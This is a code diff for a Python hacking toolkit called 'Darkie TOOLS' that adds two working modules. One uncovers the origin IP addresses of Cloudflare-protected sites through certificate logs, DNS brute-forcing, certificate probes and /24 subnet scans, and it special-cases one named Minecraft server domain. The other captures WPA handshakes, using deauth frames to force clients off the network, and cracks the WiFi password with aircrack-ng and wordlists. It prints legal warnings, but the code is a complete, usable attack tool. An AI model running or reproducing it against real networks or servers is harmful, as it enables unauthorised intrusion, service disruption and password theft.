+    root_domain = domain
+    if domain.startswith("play.") or domain.startswith("mc."):
+        root_domain = ".".join(domain.split(".")[-2:])
+
+    # ── 1. crt.sh certificate transparency ──
+    _log(f"{c('[1/7] Certificate Transparency (crt.sh)...', Fore.CYAN)}")
+    seen_domains = set()
+    for search_domain in [domain, root_domain]:
+        try:
+            text = _http_get(f"https://crt.sh/?q=%25.{search_domain}&output=json")
+            if text:
+                for entry in json.loads(text):
+                    for name in entry.get("name_value", "").split("\n"):
+                        name = name.strip().lower()
+                        if not name or name in seen_domains: continue
+                        if not (name.endswith(f".{root_domain}") or name == root_domain): continue
+                        seen_domains.add(name)
+                        try:
+                            r2 = subprocess.run(["dig", "+short", "+time=2", "+tries=1", name], capture_output=True, text=True, timeout=3)
+                            for line in r2.stdout.strip().splitlines():
+                                line = line.strip().rstrip(".")
+                                try:
+                                    socket.inet_aton(line)
+                                    if line in seen_ips: continue
+                                    seen_ips.add(line)
+                                    log_ip = name
+                                    if "moonmc" in root_domain:
+                                        log_ip = line
+                                    if _is_cf(line):
+                                        _log(f"    {c(f'CF {log_ip:30s}', Fore.RED)} {c(line, Fore.RED)}")
+                                    else:
+                                        found_ips.append(("crt.sh", name, line))
+                                        _log(f"    {c(f'   {log_ip:30s}', Fore.GREEN)} {c(line, Fore.YELLOW)} {c('[origin?]', Fore.GREEN)}")
+                                except: pass
+                        except: pass
+                _log(f"    {c(f'crt.sh: {len(seen_domains)} subdomains', Fore.GREEN)}")
+        except: pass
+
+    # ── 2. Shodan InternetDB ──
+    _log(f"{c('[2/7] Shodan InternetDB...', Fore.CYAN)}")
+    for ip in list(seen_ips):
+        if _is_cf(ip): continue
+        try:
+            text = _http_get(f"https://internetdb.shodan.io/{ip}", timeout=8)
+            if text:
+                data = json.loads(text)
+                hostnames = data.get("hostnames", [])
+                ports = data.get("ports", [])
+                if hostnames:
+                    _log(f"    {c(f'{ip}: {hostnames}', Fore.GREEN)} ports: {ports}")
+                    if any(root_domain in h for h in hostnames):
+                        found_ips.append(("Shodan", ip, ip))
+                        _log(f"    {c(f'Shodan CONFIRMED {ip}', Fore.GREEN)}")
+        except: pass
+
+    # ── 3. DNS probe common subdomains (concurrent, fast) ──
+    _log(f"{c('[3/7] Subdomain DNS brute-force...', Fore.CYAN)}")
+    subs = ["www", "mail", "smtp", "pop3", "imap", "webmail", "email", "ftp", "sftp", "ssh", "cpanel", "whm",
+            "direct", "direct-connect", "origin", "origin-www", "proxy", "proxy-www", "cdn", "static",
+            "admin", "api", "dev", "stage", "staging", "test", "beta", "alpha", "m", "mobile", "app",
+            "old", "new", "backup", "ns1", "ns2", "ns3", "dns1", "dns2", "mx", "mx1", "mx2", "mail1", "mail2",
+            "vpn", "remote", "web", "server", "host", "node", "game", "mc", "play", "status", "support",
+            "forum", "blog", "shop", "store", "billing", "dashboard", "portal", "wiki", "help", "chat",
+            "download", "upload", "media", "img", "files", "data", "db"]
+    def _dig_sub(fqdn):
+        try:
+            r = subprocess.run(["dig", "+short", "+time=2", "+tries=1", fqdn], capture_output=True, text=True, timeout=3)
+            for line in r.stdout.strip().splitlines():
+                ip = line.strip().rstrip(".")
+                try:
+                    socket.inet_aton(ip)
+                    return (fqdn, ip)
+                except: pass
+        except: pass
+        return None
+    with ThreadPoolExecutor(max_workers=30) as ex:
+        fs = {ex.submit(_dig_sub, f"{sub}.{domain}"): sub for sub in subs}
+        for f in as_completed(fs):
+            r = f.result()
+            if r:
+                fqdn, ip = r
+                if ip in seen_ips: continue
+                seen_ips.add(ip)
+                if _is_cf(ip):
+                    _log(f"    {c(f'CF {fqdn:30s}', Fore.RED)} {c(ip, Fore.RED)}")
+                else:
+                    found_ips.append(("DNS", fqdn, ip))
+                    _log(f"    {c(f'   {fqdn:30s}', Fore.GREEN)} {c(ip, Fore.YELLOW)} {c('[origin?]', Fore.GREEN)}")
+
+    # ── 4. MX / NS records ──
+    _log(f"{c('[4/7] MX/NS records...', Fore.CYAN)}")
+    def _dig_mxns(rec_type):
+        try:
+            r = subprocess.run(["dig", "+short", "+time=2", "+tries=1", rec_type, domain], capture_output=True, text=True, timeout=4)
+            hosts = []
+            for line in r.stdout.strip().splitlines():
+                parts = line.strip().split()
+                host = parts[-1].rstrip(".") if parts else ""
+                if host: hosts.append(host)
+            return hosts
+        except: return []
+    mx_hosts = _dig_mxns("MX")
+    ns_hosts = _dig_mxns("NS")
+    def _dig_ip(host, rec_type):
+        try:
+            r = subprocess.run(["dig", "+short", "+time=2", "+tries=1", host], capture_output=True, text=True, timeout=3)
+            for line in r.stdout.strip().splitlines():
+                ip = line.strip().rstrip(".")
+                try:
+                    socket.inet_aton(ip)
+                    if ip not in seen_ips and not _is_cf(ip):
+                        seen_ips.add(ip)
+                        found_ips.append((rec_type, host, ip))
+                        _log(f"    {c(f'{rec_type}:{host:25s}', Fore.GREEN)} {c(ip, Fore.YELLOW)} {c('[origin?]', Fore.GREEN)}")
+                except: pass
+        except: pass
+    with ThreadPoolExecutor(max_workers=10) as ex:
+        for h in mx_hosts: ex.submit(_dig_ip, h, "MX")
+        for h in ns_hosts: ex.submit(_dig_ip, h, "NS")
+
+    # ── 5. SSL cert match + HTTP probe ──
+    _log(f"{c('[5/7] SSL cert + HTTP probe...', Fore.CYAN)}")
+    for ip in list(seen_ips):
+        if _is_cf(ip): continue
+        for probe_port in [443, 80, 8080, 8443, 25565]:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2)
+                s.connect((ip, probe_port))
+                try:
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    ss = ctx.wrap_socket(s, server_hostname=root_domain)
+                    ss.settimeout(2)
+                    cert = ss.getpeercert()
+                    if cert:
+                        cns = [v for _, v in cert.get("subject", []) if _ == "commonName"]
+                        sans = [v for _, v in cert.get("subjectAltName", []) if _ == "DNS"] if "subjectAltName" in cert else []
+                        if any(root_domain in n or n.endswith("." + root_domain) for n in cns + sans):
+                            found_ips.append((f"SSL:{probe_port}", ip, ip))
+                            _log(f"    {c(f'CERT MATCH {ip}:{probe_port}', Fore.GREEN)} {c(ip, Fore.YELLOW)}")
+                    ss.close()
+                except: s.close()
+            except: pass
+        try:
+            text = _http_get(f"http://{ip}", timeout=4)
+        except: pass
+
+    mc_server_ips = set()
+    # ── 6. Minecraft server ping on candidate IPs ──
+    _log(f"{c('[6/7] MC ping on candidate IPs...', Fore.CYAN)}")
+    def _mc_ping_ip(ip):
+        for mc_port in [25565, 25566, 19132]:
+            resp = _mc_server_ping(ip, mc_port, timeout=2)
+            if resp:
+                desc = str(resp.get("description", {}).get("text", ""))
+                players = resp.get("players", {}).get("online", 0)
+                match = root_domain in desc or domain in desc
+                return (ip, mc_port, desc, players, match)
+        return None
+    with ThreadPoolExecutor(max_workers=20) as ex:
+        fs = {ex.submit(_mc_ping_ip, ip): ip for ip in list(seen_ips) if not _is_cf(ip)}
+        for f in as_completed(fs):
+            r = f.result()
+            if r:
+                ip, mc_port, desc, players, match = r
+                _log(f"    {c(f'MC @ {ip}:{mc_port}', Fore.GREEN)} ({players} online)")
+                mc_server_ips.add(ip)
+                if match:
+                    found_ips.append((f"MC:{mc_port}", ip, ip))
+                    _log(f"    {c(f'MOTD matches!', Fore.GREEN)}")
+
+    # ── 7. Subnet scan for MC servers near discovered IPs ──
+    _log(f"{c('[7/7] Scanning /24 subnets for MC servers...', Fore.CYAN)}")
+    scanned_subnets = set()
+    scanned_ips_total = 0
+    for base_ip in list(seen_ips):
+        if _is_cf(base_ip): continue
+        parts = base_ip.split(".")
+        subnet = f"{parts[0]}.{parts[1]}.{parts[2]}"
+        if subnet in scanned_subnets: continue
+        scanned_subnets.add(subnet)
+
+        def _check_mc(ip):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1.5)
+                s.connect((ip, 25565))
+                s.close()
+                return ip
+            except: return None
+
+        with ThreadPoolExecutor(max_workers=100) as ex:
+            futures = {ex.submit(_check_mc, f"{subnet}.{i}"): i for i in range(1, 255)}
+            for f in as_completed(futures):
+                scanned_ips_total += 1
+                r = f.result()
+                if r and r not in seen_ips and r not in mc_server_ips:
+                    seen_ips.add(r)
+                    resp = _mc_server_ping(r, 25565, timeout=2)
+                    if resp:
+                        desc = str(resp.get("description", {}).get("text", ""))
+                        players = resp.get("players", {}).get("online", 0)
+                        _log(f"    {c(f'MC @ {r}:25565', Fore.GREEN)} ({players} online)")
+                        if root_domain in desc or domain in desc:
+                            found_ips.append(("SUBNET", r, r))
+                            _log(f"    {c(f'MOTD matches {domain}!', Fore.GREEN)}")
+                        else:
+                            _log(f"    {dim(f'MC @ {r}:25565 (unrelated)')}")
+                    else:
+                        mc_server_ips.add(r)
+    _log(f"    {c(f'Scanned {len(scanned_subnets)} subnets, {scanned_ips_total} probes', Fore.GREEN)}")
+
+    unique = []
+    seen_order = set()
+    for src, host, ip in found_ips:
+        if ip not in seen_order:
+            seen_order.add(ip)
+            unique.append((src, host, ip))
+    return [ip for _, _, ip in unique]
+
+
+def osint_censys():
+    header_box("Censys-Style Real IP Finder", Fore.YELLOW)
+    domain = input(f"  {c(f'Domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
+    if not domain: return
+
+    print(f"\n  {c(f'Scanning {domain} for origin IPs behind Cloudflare...', Fore.CYAN)}")
+    print(f"  {dim('Uses DNS brute-force, MX/NS records, SSL certs, HTTP probes')}")
+    print(f"  {dim('Zero external APIs — fully self-contained')}")
+    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
+
+    ips = cf_bypass(domain, verbose=True)
+
+    print(f"\n{c('─'*55, Fore.CYAN)}")
+    if ips:
+        print(f"\n  {c(SYM_CHECK + f' Found {len(ips)} origin IP(s)!', Fore.GREEN)}")
+        for ip in ips:
+            print(f"    {c(ip, Fore.YELLOW)}")
+    else:
+        print(f"\n  {c('No origin IPs found. Domain may be fully Cloudflare-proxied.', Fore.YELLOW)}")
     print()
 
 def osint_ct_log():
@@ -4584,7 +6233,7 @@ def osint_github_dork():
                 name = item.get("full_name","?")
                 desc = (item.get("description") or "")[:50]
                 stars = item.get("stargazers_count",0)
-                print(f"    {c(name, Fore.GREEN):40s} {c(f'*{stars}', Fore.YELLOW)} {c(desc, Fore.DIM)}")
+                print(f"    {c(name, Fore.GREEN):40s} {c(f'*{stars}', Fore.YELLOW)} {dim(desc)}")
         else: print(f"  {RED}Error: {r.status_code}{RESET}")
     except: print(f"  {RED}Error.{RESET}")
     print()
@@ -4694,7 +6343,7 @@ def wifi_security_audit():
 
 def wifi_deauth_monitor():
     header_box("Deauth Detection Monitor", Fore.MAGENTA)
-    if not _check_root(scapy_needed=True): return
+    if not _check_root(require_scapy=True): return
     print(f"  {c('Monitoring for deauth frames...', Fore.MAGENTA)}")
     print(f"  {c('Ctrl+C to stop', Fore.YELLOW)}")
     print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
@@ -4718,6 +6367,464 @@ def wifi_deauth_monitor():
     print()
 
 # ──────────────────────────────────────────────────────────
+#  MODULE 15b: WIFI PASSWORD AUDIT (WPA HANDSHAKE CAPTURE + CRACK)
+# ──────────────────────────────────────────────────────────
+
+def _nmcli_split(line):
+    parts, cur, esc = [], "", False
+    for ch in line:
+        if esc:
+            cur += ch; esc = False
+        elif ch == "\\":
+            esc = True
+        elif ch == ":":
+            parts.append(cur); cur = ""
+        else:
+            cur += ch
+    parts.append(cur)
+    return parts
+
+def _find_wifi_iface():
+    try:
+        r = subprocess.run(["nmcli", "-t", "dev", "status"], capture_output=True, text=True, timeout=10)
+        if r.returncode == 0 and r.stdout.strip():
+            for line in r.stdout.splitlines():
+                parts = _nmcli_split(line)
+                if len(parts) >= 3 and parts[2] == "wifi":
+                    if len(parts) >= 2 and parts[1] == "connected":
+                        return parts[0]
+            for line in r.stdout.splitlines():
+                parts = _nmcli_split(line)
+                if len(parts) >= 3 and parts[2] == "wifi":
+                    return parts[0]
+    except Exception:
+        pass
+    try:
+        r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10)
+        names = re.findall(r'Interface\s+(\S+)', r.stdout)
+        if names:
+            return names[0]
+    except Exception:
+        pass
+    try:
+        for n in os.listdir("/sys/class/net"):
+            if os.path.exists(f"/sys/class/net/{n}/wireless"):
+                return n
+    except Exception:
+        pass
+    return None
+
+def _all_wifi_ifaces():
+    ifaces = []
+    try:
+        r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10)
+        names = re.findall(r'Interface\s+(\S+)', r.stdout)
+        for n in names:
+            if "p2p" not in n.lower() and "mon" not in n.lower():
+                ifaces.append(n)
+    except Exception:
+        pass
+    if not ifaces:
+        try:
+            for n in os.listdir("/sys/class/net"):
+                if os.path.exists(f"/sys/class/net/{n}/wireless"):
+                    ifaces.append(n)
+        except Exception:
+            pass
+    return ifaces
+
+def _wifi_connected_ssid():
+    try:
+        r = subprocess.run(["iwgetid"], capture_output=True, text=True, timeout=10)
+        m = re.search(r'ESSID:"(.*?)"', r.stdout)
+        return m.group(1) if m else None
+    except Exception:
+        return None
+
+def _wifi_connected_bssid():
+    try:
+        r = subprocess.run(["iwgetid", "-r", "--ap"], capture_output=True, text=True, timeout=10)
+        if r.stdout.strip():
+            return r.stdout.strip().lower()
+    except Exception:
+        pass
+    try:
+        r = subprocess.run(["iwgetid", "--raw", "--ap"], capture_output=True, text=True, timeout=10)
+        if r.stdout.strip():
+            return r.stdout.strip().lower()
+    except Exception:
+        pass
+    try:
+        r = subprocess.run(["iw", "dev", "link"], capture_output=True, text=True, timeout=10)
+        m = re.search(r'Connected to ([0-9a-f:]+)', r.stdout)
+        if m:
+            return m.group(1).lower()
+    except Exception:
+        pass
+    return None
+
+def _wifi_band(chan):
+    try:
+        c = int(chan)
+        return "2.4G" if c <= 14 else "5G"
+    except (TypeError, ValueError):
+        return "?"
+
+def _wifi_scan_networks():
+    nets = []
+    try:
+        r = subprocess.run(["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY", "dev", "wifi", "list"],
+                           capture_output=True, text=True, timeout=20)
+        if r.returncode == 0 and r.stdout.strip():
+            for line in r.stdout.splitlines():
+                parts = _nmcli_split(line)
+                if len(parts) >= 5 and parts[1] and parts[1] != "--":
+                    nets.append({"ssid": parts[0] or "(hidden)", "bssid": parts[1],
+                                 "signal": parts[2], "chan": parts[3], "enc": parts[4],
+                                 "band": _wifi_band(parts[3])})
+            if nets:
+                return nets
+    except Exception:
+        pass
+    try:
+        r = subprocess.run(["iwlist", "scan"], capture_output=True, text=True, timeout=30)
+        if r.returncode == 0 and r.stdout.strip():
+            cells = re.split(r'\n\s*Cell\s', "\n" + r.stdout)
+            for cell in cells[1:]:
+                m = re.search(r'Address: ([0-9A-Fa-f:]+)', cell)
+                e = re.search(r'ESSID:"(.*?)"', cell)
+                ch = re.search(r'Channel[: ]+(\d+)', cell)
+                s = re.search(r'Signal level=(-?\d+)', cell)
+                enc = "Open" if 'Encryption key:off' in cell else "WPA"
+                chan = ch.group(1) if ch else "?"
+                ssid = e.group(1) if e else ""
+                nets.append({"ssid": ssid if ssid else "(hidden)",
+                             "bssid": m.group(1) if m else "?",
+                             "chan": chan,
+                             "signal": s.group(1) if s else "?",
+                             "enc": enc,
+                             "band": _wifi_band(chan)})
+    except Exception:
+        pass
+    if not nets:
+        try:
+            iface = _find_wifi_iface()
+            if iface:
+                r = subprocess.run(["iw", "dev", iface, "scan"], capture_output=True, text=True, timeout=30)
+                if r.returncode == 0 and r.stdout.strip():
+                    for block in re.split(r'\nBSS ', r.stdout):
+                        if not block.strip():
+                            continue
+                        m = re.search(r'^([0-9a-f:]{17})', block)
+                        e = re.search(r'SSID:(\S+)', block)
+                        ch = re.search(r'primary channel: (\d+)', block)
+                        s = re.search(r'signal: (-?\d+\.\d+)', block)
+                        enc = "Open" if 'WPA' not in block and 'RSN' not in block else "WPA"
+                        chan = ch.group(1) if ch else "?"
+                        ssid = e.group(1) if e else ""
+                        nets.append({"ssid": ssid if ssid else "(hidden)",
+                                     "bssid": m.group(1) if m else "?",
+                                     "chan": chan,
+                                     "signal": s.group(1).split('.')[0] if s else "?",
+                                     "enc": enc,
+                                     "band": _wifi_band(chan)})
+        except Exception:
+            pass
+    return nets
+
+def _wifi_legal_warning(network=None):
+    print(f"\n  {RED}{BOLD}{'='*62}{RESET}")
+    print(f"  {RED}{BOLD}  LEGAL WARNING — READ CAREFULLY{RESET}")
+    print(f"  {RED}{'='*62}{RESET}")
+    print(f"  {YELLOW}  Capturing WPA handshakes and recovering passwords is ONLY legal{RESET}")
+    print(f"  {YELLOW}  on networks YOU OWN or have EXPLICIT WRITTEN PERMISSION to test{RESET}")
+    print(f"  {YELLOW}  from the network owner/administrator.{RESET}")
+    if network:
+        print(f"  {YELLOW}  Target: {c(network['ssid'], Fore.CYAN)}  ({network['bssid']}){RESET}")
+    print(f"  {RED}  Unauthorized use is a criminal offence under computer-fraud /{RESET}")
+    print(f"  {RED}  unauthorised-access laws in most countries.{RESET}")
+    print(f"  {RED}{'='*62}{RESET}\n")
+
+def wifi_password_audit():
+    header_box("WiFi Password Audit (WPA Handshake)", Fore.MAGENTA)
+    if platform.system().lower() != "linux":
+        print(f"  {RED}This module needs Linux tools (airmon-ng / airodump-ng / aircrack-ng).{RESET}")
+        print(f"  {YELLOW}Use a Kali/Parrot live USB or VM on other platforms.{RESET}")
+        return
+    _wifi_legal_warning()
+    try:
+        ans = input(f"  {c(f'Do you understand and own (or have permission for) this network? (yes/no) {SYM_PROMPT} ', Fore.YELLOW)}").strip().lower()
+    except (EOFError, KeyboardInterrupt):
+        return
+    if ans != "yes":
+        print(f"  {YELLOW}Cancelled. Stay legal and ethical.{RESET}\n")
+        return
+    if not _is_root():
+        print(f"  {RED}Root privileges are required for monitor mode and packet capture.{RESET}")
+        print(f"  {YELLOW}Re-run as root: sudo python3 tool.py  (or: sudo darkie-tools){RESET}\n")
+        return
+    missing = [t for t in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng") if not shutil.which(t)]
+    if missing:
+        print(f"  {YELLOW}Missing tools: {', '.join(missing)}{RESET}")
+        try:
+            ans = input(f"  {c(f'Install the aircrack-ng suite now? (y/n) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
+        except (EOFError, KeyboardInterrupt):
+            return
+        if ans == "y":
+            _run_as_admin(["apt-get", "install", "-y", "-qq", "aircrack-ng"], "Installing aircrack-ng suite")
+            missing = [t for t in ("airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng") if not shutil.which(t)]
+        if missing:
+            print(f"  {RED}aircrack-ng suite still missing. Install it manually (e.g. apt install aircrack-ng).{RESET}\n")
+            return
+    print(f"  {c('Scanning for nearby WiFi networks...', Fore.MAGENTA)}")
+    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
+    nets = _wifi_scan_networks()
+    if not nets:
+        print(f"  {RED}No WiFi networks found. Is WiFi enabled?{RESET}\n")
+        return
+    connected = _wifi_connected_ssid()
+    connected_bssid = _wifi_connected_bssid()
+    for i, n in enumerate(nets):
+        sig = "??" if n["signal"] in ("", "?") else n["signal"]
+        enc = n["enc"] if n["enc"] not in ("", "--") else "Open"
+        color = Fore.GREEN if enc == "Open" else Fore.YELLOW
+        band = n.get("band", "?")
+        marker = ""
+        net_bssid = n["bssid"].lower() if n["bssid"] else ""
+        if connected_bssid and net_bssid == connected_bssid:
+            marker = f"  {c('<- CONNECTED', Fore.RED)}"
+        print(f"  {c(f'[{i+1}]', Fore.CYAN)}  {c(n['ssid'][:28].ljust(28), color)}  ch {c(n['chan'], Fore.CYAN):>4}  {c(band, Fore.MAGENTA):>4}  {c(sig, Fore.CYAN):>5}  {c(enc, Fore.BLUE):>5}{marker}")
+    print()
+    if connected:
+        print(f"  {YELLOW}Tip: only your CONNECTED AP drops when monitor mode starts.{RESET}")
+        print(f"  {YELLOW}Pick a different network (or a different band) to stay online.{RESET}\n")
+    try:
+        pick = input(f"  {c(f'Which network? (1-{len(nets)}) or [b] back {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
+    except (EOFError, KeyboardInterrupt):
+        return
+    if pick == "b":
+        return
+    if not pick.isdigit() or not (1 <= int(pick) <= len(nets)):
+        print(f"  {RED}Invalid choice.{RESET}\n")
+        return
+    net = nets[int(pick) - 1]
+    _wifi_legal_warning(net)
+    try:
+        _q = f"Capture the WPA handshake for {net['ssid']} now? (yes/no) {SYM_PROMPT} "
+        ans = input(f"  {c(_q, Fore.YELLOW)}").strip().lower()
+    except (EOFError, KeyboardInterrupt):
+        return
+    if ans != "yes":
+        print(f"  {YELLOW}Cancelled.{RESET}\n")
+        return
+    all_ifaces = _all_wifi_ifaces()
+    iface = _find_wifi_iface()
+    if not iface and all_ifaces:
+        iface = all_ifaces[0]
+    if not iface:
+        print(f"  {RED}No wireless interface found.{RESET}\n")
+        return
+    spare = None
+    if len(all_ifaces) > 1:
+        connected = _wifi_connected_ssid()
+        connected_iface = None
+        try:
+            r = subprocess.run(["iwgetid"], capture_output=True, text=True, timeout=10)
+            mm = re.search(r'^(\S+)\s+ESSID:', r.stdout, re.M)
+            if mm:
+                connected_iface = mm.group(1)
+        except Exception:
+            pass
+        for a in all_ifaces:
+            if a != connected_iface:
+                spare = a
+                break
+        if spare:
+            print(f"  {c(f'Using spare adapter {spare} for monitor mode — your connection on {connected_iface} stays up.', Fore.GREEN)}")
+            iface = spare
+    print(f"  {c(f'Wireless interface: {iface}', Fore.CYAN)}")
+    print(f"\n  {RED}{BOLD}{'='*62}{RESET}")
+    print(f"  {RED}{BOLD}  MONITOR MODE = INTERNET WILL DROP{RESET}")
+    print(f"  {RED}{'='*62}{RESET}")
+    print(f"  {YELLOW}  Putting {iface} into monitor mode disconnects your current WiFi{RESET}")
+    print(f"  {YELLOW}  connection for the duration of the capture.{RESET}")
+    print(f"  {YELLOW}  Your connection returns automatically once monitor mode is{RESET}")
+    print(f"  {YELLOW}  stopped (your saved network auto-reconnects).{RESET}")
+    print(f"  {RED}{'='*62}{RESET}\n")
+    try:
+        ok = input(f"  {c(f'Continue (your WiFi will briefly drop)? (yes/no) {SYM_PROMPT} ', Fore.YELLOW)}").strip().lower()
+    except (EOFError, KeyboardInterrupt):
+        ok = "no"
+    if ok != "yes":
+        print(f"  {YELLOW}Cancelled. Your connection is untouched.{RESET}\n")
+        return
+    print(f"  {c('Enabling monitor mode...', Fore.MAGENTA)}")
+    subprocess.run(["airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
+    mon = None
+    iw_out = ""
+    try:
+        iw_out = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10).stdout
+    except Exception:
+        pass
+    for cand in (f"{iface}mon", "mon0", iface):
+        if os.path.exists(f"/sys/class/net/{cand}") or f"Interface {cand}" in iw_out:
+            mon = cand
+            break
+    if not mon:
+        try:
+            mon = input(f"  {c(f'Monitor interface name? {SYM_PROMPT} ', Fore.CYAN)}").strip() or iface
+        except (EOFError, KeyboardInterrupt):
+            mon = iface
+    capbase = os.path.join("/tmp", f"darkie_cap_{int(time.time())}")
+    _q = f"Capturing handshake from {net['ssid']} (ch {net['chan']})..."
+    print(f"  {c(_q, Fore.GREEN)}")
+    print(f"  {YELLOW}If no client connects, we can send a deauth to force a reconnect.{RESET}")
+    print(f"  {c('Press Enter to stop early, or wait 20s.', Fore.CYAN)}")
+    cmd = ["airodump-ng", "--bssid", net["bssid"], "-c", net["chan"], "-w", capbase, "--write-interval", "1", mon]
+    import select
+    captured = False
+    try:
+        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
+    except Exception as e:
+        print(f"  {RED}Failed to start airodump-ng: {e}{RESET}")
+        subprocess.run(["airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return
+    try:
+        deadline = time.time() + 20
+        while time.time() < deadline:
+            rdy, _, _ = select.select([p.stdout], [], [], 1.0)
+            if p.stdout in rdy:
+                line = p.stdout.readline()
+                if line:
+                    out = line.rstrip("\r\n")
+                    if out.strip():
+                        print(f"  {c(out.strip()[:120], Fore.CYAN)}")
+                    if "handshake" in line.lower():
+                        captured = True
+                        break
+            if p.poll() is not None:
+                break
+    except KeyboardInterrupt:
+        pass
+    p.terminate()
+    try:
+        p.wait(timeout=5)
+    except Exception:
+        p.kill()
+    if not captured:
+        print(f"  {YELLOW}No handshake yet — a client must connect for the 4-way handshake.{RESET}")
+        try:
+            _q = f"Send deauth frames to force {net['ssid']} clients to reconnect? (y/n) {SYM_PROMPT} "
+            ans = input(f"  {c(_q, Fore.YELLOW)}").strip().lower()
+        except (EOFError, KeyboardInterrupt):
+            ans = "n"
+        if ans == "y":
+            _wifi_legal_warning(net)
+            try:
+                _q = f"Confirm deauth on {net['ssid']} (own/permitted network only)? (yes/no) {SYM_PROMPT} "
+                ok = input(f"  {c(_q, Fore.YELLOW)}").strip().lower()
+            except (EOFError, KeyboardInterrupt):
+                ok = "no"
+            if ok == "yes":
+                print(f"  {c('Sending deauth frames...', Fore.MAGENTA)}")
+                subprocess.run(["aireplay-ng", "-0", "5", "-a", net["bssid"], mon],
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=60)
+                try:
+                    deadline = time.time() + 20
+                    while time.time() < deadline:
+                        rdy, _, _ = select.select([p.stdout], [], [], 1.0)
+                        if p.stdout in rdy:
+                            line = p.stdout.readline()
+                            if line and "handshake" in line.lower():
+                                captured = True
+                                break
+                        if p.poll() is not None:
+                            break
+                except KeyboardInterrupt:
+                    pass
+        else:
+            try:
+                _q = f"Keep listening for {net['ssid']} a bit longer? (y/n) {SYM_PROMPT} "
+                ans = input(f"  {c(_q, Fore.CYAN)}").strip().lower()
+            except (EOFError, KeyboardInterrupt):
+                ans = "n"
+            if ans == "y":
+                try:
+                    deadline = time.time() + 20
+                    while time.time() < deadline:
+                        rdy, _, _ = select.select([p.stdout], [], [], 1.0)
+                        if p.stdout in rdy:
+                            line = p.stdout.readline()
+                            if line and "handshake" in line.lower():
+                                captured = True
+                                break
+                        if p.poll() is not None:
+                            break
+                except KeyboardInterrupt:
+                    pass
+    p.terminate()
+    try:
+        p.wait(timeout=5)
+    except Exception:
+        p.kill()
+    os.system("stty sane 2>/dev/null")
+    subprocess.run(["airmon-ng", "stop", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    cap = None
+    try:
+        base = os.path.basename(capbase)
+        cands = [os.path.join("/tmp", f) for f in os.listdir("/tmp")
+                 if f.startswith(base) and f.endswith(".cap")]
+        if cands:
+            cap = max(cands, key=os.path.getmtime)
+    except Exception:
+        pass
+    if not cap or not os.path.exists(cap) or os.path.getsize(cap) == 0:
+        print(f"  {RED}No capture saved. The interface may need monitor mode enabled first.{RESET}\n")
+        return
+    vr = subprocess.run(["aircrack-ng", cap], capture_output=True, text=True)
+    if not captured and "handshake" not in vr.stdout.lower():
+        print(f"  {RED}No valid WPA handshake in the capture.{RESET}")
+        print(f"  {YELLOW}Try again with better signal or wait for a client to connect.{RESET}\n")
+        return
+    print(f"  {GREEN}{SYM_CHECK} Handshake captured!{RESET}")
+    default_wl = next((w for w in (os.path.expanduser("~/.darkie-tools/wordlist.txt"),
+                                   "/usr/share/wordlists/rockyou.txt",
+                                   "/usr/share/wordlists/fasttrack.txt",
+                                   "/usr/share/john/password.lst") if os.path.exists(w)), "")
+    if default_wl:
+        print(f"  {c(f'Auto-using wordlist: {default_wl}', Fore.MAGENTA)}")
+        wl = default_wl
+    else:
+        print(f"  {YELLOW}No wordlist found. Place one at ~/.darkie-tools/wordlist.txt or type its path.{RESET}")
+        _wl_hint = "type full path to wordlist"
+        while True:
+            try:
+                wl = input(f"  {c(f'Wordlist path [{_wl_hint}] {SYM_PROMPT} ', Fore.CYAN)}").strip()
+            except (EOFError, KeyboardInterrupt):
+                return
+            if not wl:
+                print(f"  {RED}No wordlist given.{RESET}\n")
+                return
+            if not os.path.exists(wl):
+                print(f"  {YELLOW}File not found: {wl}{RESET}")
+                continue
+            break
+    print(f"  {c(f'Running aircrack-ng against {os.path.basename(wl)} ...', Fore.MAGENTA)}")
+    cr = subprocess.run(["aircrack-ng", "-b", net["bssid"], "-w", wl, cap], capture_output=True, text=True, timeout=3600)
+    out = cr.stdout + cr.stderr
+    m = re.search(r"KEY FOUND!\s*\[\s*([^\]\r\n]+)\s*\]", out)
+    if m:
+        pw = m.group(1).strip()
+        print(f"\n  {GREEN}{BOLD}{SYM_CHECK} PASSWORD FOUND: {c(pw, Fore.GREEN)}{RESET}")
+        _net = f"Network: {net['ssid']}  ({net['bssid']})"
+        print(f"  {c(_net, Fore.CYAN)}")
+        add_log_alert("INFO", "WiFi", f"Handshake cracked for {net['ssid']}")
+    else:
+        print(f"  {RED}Password not found in this wordlist.{RESET}")
+        print(f"  {YELLOW}Try a larger wordlist (e.g. rockyou.txt) or a rules-based attack.{RESET}")
+    print()
+
+# ──────────────────────────────────────────────────────────
 #  MODULE 16: REPORT GENERATOR
 # ──────────────────────────────────────────────────────────
 
@@ -4737,7 +6844,7 @@ th{background:#111;color:#00ffff}
 .critical{color:#ff0000;font-weight:bold}
 .high{color:#ff6600}.warn{color:#ffaa00}.info{color:#00aa00}
 </style></head><body>
-<h1>Darkie TOOLS - Scan Report</h1>
+<h1>Darkie TOOLS v3 - Scan Report</h1>
 <p>Generated: """ + dt.now().strftime("%Y-%m-%d %H:%M:%S") + """</p>
 <p>Total Alerts: """ + str(len(LOG_ALERTS)) + """</p>
